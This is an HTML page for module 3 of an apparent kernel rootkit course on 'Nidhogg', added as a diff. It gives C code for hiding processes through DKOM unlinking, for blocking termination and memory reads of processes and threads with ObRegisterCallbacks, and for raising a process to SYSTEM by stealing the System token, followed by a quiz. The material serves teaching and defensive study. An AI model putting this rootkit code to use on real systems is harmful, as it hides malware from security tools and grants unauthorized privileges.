@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 3: Process & Thread Manipulation - Nidhogg Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F409;</text></svg>">
+<link rel="stylesheet" href="../../../assets/course.css">
+<style>:root{--accent:#dc2626;--accent2:#b91c1c;--gradient:linear-gradient(135deg,#dc2626,#b91c1c)}</style>
+</head>
+<body>
+
+<button class="hamburger" aria-label="Toggle navigation">&#9776;</button>
+
+<nav>
+<div class="logo">
+<h2>Nidhogg Course</h2>
+<span>Kernel Rootkit Masterclass</span>
+</div>
+<a class="home-link" href="../Nidhogg_index.html">&larr; Course Home</a>
+<a class="mod-link" href="module1.html"><span>1. Kernel vs User-Mode</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module2.html"><span>2. Driver Basics</span><span class="diff d1">d1</span></a>
+<a class="mod-link active" href="module3.html"><span>3. Process &amp; Thread</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module4.html"><span>4. File &amp; Registry</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module5.html"><span>5. ETW Disabling</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module6.html"><span>6. Callbacks &amp; Notifications</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module7.html"><span>7. Memory Evasion</span><span class="diff d3">d3</span></a>
+<a class="mod-link" href="module8.html"><span>8. Full Chain &amp; Detection</span><span class="diff d3">d3</span></a>
+</nav>
+
+<main>
+<span class="diff-badge easy">Difficulty: Beginner</span>
+<h1>Module 3: Process &amp; Thread Manipulation</h1>
+<p class="subtitle">EPROCESS, ActiveProcessLinks, DKOM for process hiding, and kernel-level PID protection.</p>
+
+<div class="card highlight">
+<h4>Module Objective</h4>
+<p>Understand how Windows represents processes and threads in kernel memory via <code>EPROCESS</code> and <code>ETHREAD</code> structures, how process enumeration works through the <code>ActiveProcessLinks</code> doubly-linked list, how Nidhogg hides processes using Direct Kernel Object Manipulation (DKOM), and how <code>ObRegisterCallbacks</code> provides handle-based process protection.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>1. The EPROCESS Structure</h2>
+
+<p>Every running process on Windows is represented in kernel memory by an <code>EPROCESS</code> structure. This is a large, opaque structure (several kilobytes) maintained by the kernel. Key fields relevant to rootkit development:</p>
+
+<pre><span class="lang-tag">C</span>// Partial EPROCESS layout (offsets vary by Windows build)
+// Use WinDbg: dt nt!_EPROCESS to see actual offsets
+typedef struct _EPROCESS {
+    KPROCESS        Pcb;                // +0x000 Kernel process block
+    // ...
+    EX_PUSH_LOCK    ProcessLock;        // Process synchronization lock
+    // ...
+    HANDLE          UniqueProcessId;    // +0x440 (approx) The PID
+    LIST_ENTRY      ActiveProcessLinks; // +0x448 (approx) Doubly-linked list
+    // ...
+    UCHAR           ImageFileName[15];  // +0x5A8 (approx) Short name
+    // ...
+    TOKEN           *Token;             // Process token (security context)
+    // ...
+} EPROCESS, *PEPROCESS;</pre>
+
+<div class="card warn">
+<h4>Offset Volatility</h4>
+<p>EPROCESS field offsets change between Windows builds. An offset that works on Windows 10 21H2 may be different on Windows 11 23H2. Nidhogg handles this by either using documented kernel APIs to access fields (preferred) or by dynamically resolving offsets at runtime. Hardcoding offsets is fragile and a common source of BSODs.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>2. ActiveProcessLinks: The Process List</h2>
+
+<p>All active processes are linked together through a doubly-linked list using the <code>ActiveProcessLinks</code> field of EPROCESS. This is a standard <code>LIST_ENTRY</code> structure:</p>
+
+<pre><span class="lang-tag">C</span>// LIST_ENTRY is the fundamental Windows kernel linked list node
+typedef struct _LIST_ENTRY {
+    struct _LIST_ENTRY *Flink;  // Forward link (next entry)
+    struct _LIST_ENTRY *Blink;  // Backward link (previous entry)
+} LIST_ENTRY, *PLIST_ENTRY;</pre>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">ActiveProcessLinks Doubly-Linked List</h4>
+<div class="flow">
+<div class="flow box">EPROCESS<br><small>System (PID 4)</small><br><small>Flink &rarr;</small></div>
+<div class="flow arrow">&harr;</div>
+<div class="flow box">EPROCESS<br><small>smss.exe</small><br><small>&larr; Blink | Flink &rarr;</small></div>
+<div class="flow arrow">&harr;</div>
+<div class="flow box">EPROCESS<br><small>csrss.exe</small><br><small>&larr; Blink | Flink &rarr;</small></div>
+<div class="flow arrow">&harr;</div>
+<div class="flow box">EPROCESS<br><small>target.exe</small><br><small>&larr; Blink</small></div>
+</div>
+</div>
+
+<p>When user-mode tools call <code>NtQuerySystemInformation(SystemProcessInformation)</code> or higher-level APIs like <code>EnumProcesses</code>, <code>CreateToolhelp32Snapshot</code>, or Task Manager's process list, the kernel walks this linked list to enumerate all processes. If a process is not in the list, it is invisible to all these APIs.</p>
+
+<!-- ============================================================ -->
+<h2>3. DKOM: Direct Kernel Object Manipulation</h2>
+
+<p>DKOM is the technique of directly modifying kernel data structures to hide or alter process information. To hide a process, Nidhogg unlinks its EPROCESS from the ActiveProcessLinks list:</p>
+
+<pre><span class="lang-tag">C</span>// Nidhogg process hiding via DKOM
+NTSTATUS HideProcess(ULONG pid) {
+    PEPROCESS targetProcess;
+    NTSTATUS status;
+
+    // 1. Get EPROCESS pointer from PID
+    status = PsLookupProcessByProcessId(
+        (HANDLE)(ULONG_PTR)pid,
+        &targetProcess
+    );
+    if (!NT_SUCCESS(status)) return status;
+
+    // 2. Get the ActiveProcessLinks field
+    // Offset must be determined for the current Windows build
+    PLIST_ENTRY activeLinks = (PLIST_ENTRY)(
+        (PUCHAR)targetProcess + ACTIVE_PROCESS_LINKS_OFFSET
+    );
+
+    // 3. Unlink from the doubly-linked list
+    // Previous->Flink = Current->Flink  (skip over us going forward)
+    // Next->Blink = Current->Blink      (skip over us going backward)
+    PLIST_ENTRY prevEntry = activeLinks->Blink;
+    PLIST_ENTRY nextEntry = activeLinks->Flink;
+
+    prevEntry->Flink = nextEntry;
+    nextEntry->Blink = prevEntry;
+
+    // 4. Point our links to ourselves (safety: prevents dangling pointers)
+    activeLinks->Flink = activeLinks;
+    activeLinks->Blink = activeLinks;
+
+    // 5. Dereference the process object
+    ObDereferenceObject(targetProcess);
+
+    return STATUS_SUCCESS;
+}</pre>
+
+<div class="card green">
+<h4>Why the Process Still Runs</h4>
+<p>Unlinking from ActiveProcessLinks does <strong>not</strong> affect process scheduling. The Windows scheduler uses a different data structure &mdash; the <code>KPROCESS</code> thread list and the dispatcher ready queues. The process continues to execute normally; it is simply invisible to any code that enumerates processes by walking ActiveProcessLinks. This includes Task Manager, Process Explorer, <code>tasklist.exe</code>, and all user-mode EDR process enumeration.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>4. Finding the ActiveProcessLinks Offset</h2>
+
+<p>Since the offset varies between Windows versions, Nidhogg needs a reliable way to find it. Common approaches:</p>
+
+<table>
+<tr><th>Method</th><th>How It Works</th><th>Reliability</th></tr>
+<tr><td><strong>Hardcoded Table</strong></td><td>Maintain a table mapping Windows build numbers to known offsets</td><td>High for known builds, fails on unknown builds</td></tr>
+<tr><td><strong>PsGetProcessId Walk</strong></td><td>Use <code>PsGetProcessId</code> (documented API) to find the <code>UniqueProcessId</code> offset, then calculate <code>ActiveProcessLinks</code> offset relative to it (immediately follows PID in all known builds)</td><td>High &mdash; leverages the stable relationship between adjacent fields</td></tr>
+<tr><td><strong>Signature Scanning</strong></td><td>Scan the EPROCESS for known patterns (e.g., the PID value at a known location)</td><td>Moderate &mdash; can be fragile</td></tr>
+</table>
+
+<pre><span class="lang-tag">C</span>// Dynamically finding ActiveProcessLinks offset
+// ActiveProcessLinks immediately follows UniqueProcessId in EPROCESS
+ULONG GetActiveProcessLinksOffset() {
+    PEPROCESS currentProcess = PsGetCurrentProcess();
+    HANDLE currentPid = PsGetCurrentProcessId();
+
+    // Scan EPROCESS for the PID value
+    PUCHAR processBase = (PUCHAR)currentProcess;
+    for (ULONG offset = 0; offset < 0x600; offset += sizeof(PVOID)) {
+        if (*(PHANDLE)(processBase + offset) == currentPid) {
+            // ActiveProcessLinks is at the next LIST_ENTRY after UniqueProcessId
+            return offset + sizeof(HANDLE);  // PID is 8 bytes on x64
+        }
+    }
+    return 0;  // Failed to find offset
+}</pre>
+
+<!-- ============================================================ -->
+<h2>5. The ETHREAD Structure</h2>
+
+<p>Each thread is represented by an <code>ETHREAD</code> structure, which contains the <code>KTHREAD</code> (scheduler state) and thread-specific information:</p>
+
+<pre><span class="lang-tag">C</span>// Partial ETHREAD layout (key fields)
+typedef struct _ETHREAD {
+    KTHREAD     Tcb;                // +0x000 Kernel thread block (scheduling)
+    // ...
+    CLIENT_ID   Cid;               // Contains ProcessId + ThreadId
+    // ...
+    PEPROCESS   ThreadsProcess;    // Pointer back to owning EPROCESS
+    // ...
+    LIST_ENTRY  ThreadListEntry;   // Links all threads in a process
+    // ...
+} ETHREAD, *PETHREAD;</pre>
+
+<p>Nidhogg can manipulate threads for operations like hiding specific threads or elevating thread privileges by replacing the thread's impersonation token.</p>
+
+<!-- ============================================================ -->
+<h2>6. Process Protection via ObRegisterCallbacks</h2>
+
+<p>Beyond hiding processes, Nidhogg can <strong>protect</strong> processes from being terminated or having their memory read. This uses <code>ObRegisterCallbacks</code>, a documented kernel API that registers pre- and post-operation callbacks for object handle operations:</p>
+
+<pre><span class="lang-tag">C</span>// Registering object callbacks for process protection
+OB_CALLBACK_REGISTRATION callbackReg;
+OB_OPERATION_REGISTRATION opReg[1];
+
+// Set up operation registration for process handles
+opReg[0].ObjectType = PsProcessType;
+opReg[0].Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE;
+opReg[0].PreOperation  = PreOperationCallback;   // Called BEFORE handle is created
+opReg[0].PostOperation = NULL;
+
+callbackReg.Version                    = OB_FLT_REGISTRATION_VERSION;
+callbackReg.OperationRegistrationCount = 1;
+callbackReg.OperationRegistration      = opReg;
+callbackReg.RegistrationContext        = NULL;
+
+// Altitude string determines callback ordering
+RtlInitUnicodeString(&callbackReg.Altitude, L"321000");
+
+PVOID registrationHandle;
+NTSTATUS status = ObRegisterCallbacks(&callbackReg, &registrationHandle);</pre>
+
+<!-- ============================================================ -->
+<h2>7. Stripping Handle Access Rights</h2>
+
+<p>The pre-operation callback is where the actual protection happens. When any process tries to open a handle to a protected process, the callback fires and can strip dangerous access rights:</p>
+
+<pre><span class="lang-tag">C</span>OB_PREOP_CALLBACK_STATUS PreOperationCallback(
+    PVOID RegistrationContext,
+    POB_PRE_OPERATION_INFORMATION OperationInfo
+) {
+    // Get the target process of the handle operation
+    PEPROCESS targetProcess = (PEPROCESS)OperationInfo->Object;
+    HANDLE targetPid = PsGetProcessId(targetProcess);
+
+    // Check if this PID is in our protected list
+    if (!IsProtectedProcess(targetPid))
+        return OB_PREOP_SUCCESS;  // Not protected, allow normally
+
+    // Strip dangerous access rights from the handle
+    if (OperationInfo->Operation == OB_OPERATION_HANDLE_CREATE) {
+        OperationInfo->Parameters->CreateHandleInformation
+            .DesiredAccess &= ~PROCESS_TERMINATE;      // Can't terminate
+        OperationInfo->Parameters->CreateHandleInformation
+            .DesiredAccess &= ~PROCESS_VM_READ;         // Can't read memory
+        OperationInfo->Parameters->CreateHandleInformation
+            .DesiredAccess &= ~PROCESS_VM_WRITE;        // Can't write memory
+        OperationInfo->Parameters->CreateHandleInformation
+            .DesiredAccess &= ~PROCESS_VM_OPERATION;    // Can't VirtualProtect
+        OperationInfo->Parameters->CreateHandleInformation
+            .DesiredAccess &= ~PROCESS_CREATE_THREAD;   // Can't inject threads
+    }
+
+    return OB_PREOP_SUCCESS;
+}</pre>
+
+<div class="card">
+<h4>What This Achieves</h4>
+<table>
+<tr><th>Stripped Right</th><th>What It Blocks</th></tr>
+<tr><td><code>PROCESS_TERMINATE</code></td><td>Prevents <code>TerminateProcess</code> &mdash; process cannot be killed</td></tr>
+<tr><td><code>PROCESS_VM_READ</code></td><td>Prevents <code>ReadProcessMemory</code> &mdash; memory scanners cannot read</td></tr>
+<tr><td><code>PROCESS_VM_WRITE</code></td><td>Prevents <code>WriteProcessMemory</code> &mdash; cannot inject into the process</td></tr>
+<tr><td><code>PROCESS_VM_OPERATION</code></td><td>Prevents <code>VirtualProtectEx</code> &mdash; cannot change memory protections</td></tr>
+<tr><td><code>PROCESS_CREATE_THREAD</code></td><td>Prevents <code>CreateRemoteThread</code> &mdash; cannot inject threads</td></tr>
+</table>
+</div>
+
+<!-- ============================================================ -->
+<h2>8. Thread Protection</h2>
+
+<p>The same <code>ObRegisterCallbacks</code> mechanism works for threads by using <code>PsThreadType</code> instead of <code>PsProcessType</code>:</p>
+
+<pre><span class="lang-tag">C</span>// Thread handle protection - strip THREAD_TERMINATE and THREAD_SUSPEND_RESUME
+opReg[1].ObjectType = PsThreadType;
+opReg[1].Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE;
+opReg[1].PreOperation = ThreadPreOperationCallback;
+
+OB_PREOP_CALLBACK_STATUS ThreadPreOperationCallback(
+    PVOID RegistrationContext,
+    POB_PRE_OPERATION_INFORMATION OperationInfo
+) {
+    PETHREAD targetThread = (PETHREAD)OperationInfo->Object;
+    PEPROCESS ownerProcess = IoThreadToProcess(targetThread);
+    HANDLE ownerPid = PsGetProcessId(ownerProcess);
+
+    if (!IsProtectedProcess(ownerPid))
+        return OB_PREOP_SUCCESS;
+
+    if (OperationInfo->Operation == OB_OPERATION_HANDLE_CREATE) {
+        OperationInfo->Parameters->CreateHandleInformation
+            .DesiredAccess &= ~THREAD_TERMINATE;
+        OperationInfo->Parameters->CreateHandleInformation
+            .DesiredAccess &= ~THREAD_SUSPEND_RESUME;
+    }
+    return OB_PREOP_SUCCESS;
+}</pre>
+
+<!-- ============================================================ -->
+<h2>9. Token Elevation</h2>
+
+<p>Nidhogg can elevate a process's privileges by replacing its token with the SYSTEM token. The token is a field in the EPROCESS that determines the security context of the process:</p>
+
+<pre><span class="lang-tag">C</span>NTSTATUS ElevateProcessToken(ULONG targetPid) {
+    PEPROCESS targetProcess, systemProcess;
+
+    // Get the System process (PID 4) - always has SYSTEM token
+    PsLookupProcessByProcessId((HANDLE)4, &systemProcess);
+    PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)targetPid, &targetProcess);
+
+    // The Token field is an EX_FAST_REF in EPROCESS
+    // Copy the System process token to the target process
+    ULONG tokenOffset = GetTokenOffset();  // Build-specific offset
+
+    *(PULONG_PTR)((PUCHAR)targetProcess + tokenOffset) =
+        *(PULONG_PTR)((PUCHAR)systemProcess + tokenOffset);
+
+    ObDereferenceObject(targetProcess);
+    ObDereferenceObject(systemProcess);
+
+    return STATUS_SUCCESS;
+}</pre>
+
+<div class="card warn">
+<h4>Token Reference Counting</h4>
+<p>The above is simplified. In practice, token replacement must handle reference counting properly. The old token must be dereferenced and the new token must be referenced to prevent use-after-free bugs. The <code>EX_FAST_REF</code> encoding (lowest 4 bits store a reference count cache) must also be handled correctly.</p>
+</div>
+
+<!-- ============================================================ -->
+<div class="quiz">
+<h2>Knowledge Check</h2>
+
+<div class="quiz-q" data-answer="B">
+<p>Q1: Why does unlinking an EPROCESS from ActiveProcessLinks not stop the process from running?</p>
+<div class="quiz-btn" data-choice="A">A) The process is paused and then resumed after unlinking</div>
+<div class="quiz-btn" data-choice="B">B) The Windows scheduler uses different structures (KTHREAD dispatcher queues) for thread scheduling, not ActiveProcessLinks</div>
+<div class="quiz-btn" data-choice="C">C) ActiveProcessLinks is only used for kernel-mode enumeration</div>
+<div class="quiz-btn" data-choice="D">D) The process is moved to a hidden scheduler queue</div>
+</div>
+
+<div class="quiz-q" data-answer="A">
+<p>Q2: What does ObRegisterCallbacks allow Nidhogg to do for process protection?</p>
+<div class="quiz-btn" data-choice="A">A) Intercept handle creation for processes and strip dangerous access rights like PROCESS_TERMINATE before the handle is granted</div>
+<div class="quiz-btn" data-choice="B">B) Register a callback that is called when the process exits</div>
+<div class="quiz-btn" data-choice="C">C) Block all network traffic to and from the protected process</div>
+<div class="quiz-btn" data-choice="D">D) Encrypt the process memory pages</div>
+</div>
+
+<div class="quiz-q" data-answer="C">
+<p>Q3: Why is hardcoding EPROCESS field offsets dangerous?</p>
+<div class="quiz-btn" data-choice="A">A) Hardcoded offsets are slower than dynamic resolution</div>
+<div class="quiz-btn" data-choice="B">B) PatchGuard detects and blocks hardcoded offset access</div>
+<div class="quiz-btn" data-choice="C">C) Offsets change between Windows builds, causing the driver to access wrong memory locations and potentially BSOD</div>
+<div class="quiz-btn" data-choice="D">D) Hardcoded offsets trigger ETW events</div>
+</div>
+</div>
+
+<div class="nav-btns">
+<a href="module2.html">&larr; Previous: Windows Kernel Driver Basics</a>
+<a class="primary" href="module4.html">Next: File &amp; Registry Protection &rarr;</a>
+</div>
+</main>
+
+<script src="../../../assets/course.js"></script>
+</body>
+</html>
